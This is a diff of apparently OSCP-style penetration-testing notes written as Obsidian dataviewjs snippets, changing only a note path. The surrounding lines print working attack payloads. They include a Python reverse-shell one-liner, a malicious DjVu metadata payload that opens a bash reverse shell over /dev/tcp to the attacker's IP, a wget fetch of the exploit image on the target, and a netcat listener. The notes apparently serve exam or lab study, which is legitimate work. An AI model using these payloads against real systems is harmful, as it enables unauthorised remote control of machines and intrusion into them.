@@ -4,7 +4,7 @@ We prepared the following files on our attacker machine:
 
 shell.sh — reverse shell script:
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${KaliIP}",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);" > shell.sh`;
 
@@ -16,7 +16,7 @@ exploit — malicious DjVu metadata payload:
 sudo gedit exploit
 ```
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");
 const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `(metadata \"\\c\${system('bash -c \\\"bash -i >& /dev/tcp/${KaliIP}/4444 0>&1\\\"')};\")`;
@@ -42,7 +42,7 @@ rlwrap nc -lvnp 4444
 
 On TARGET
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
 const command = `wget http://${KaliIP}/exploit.jpg`;
 
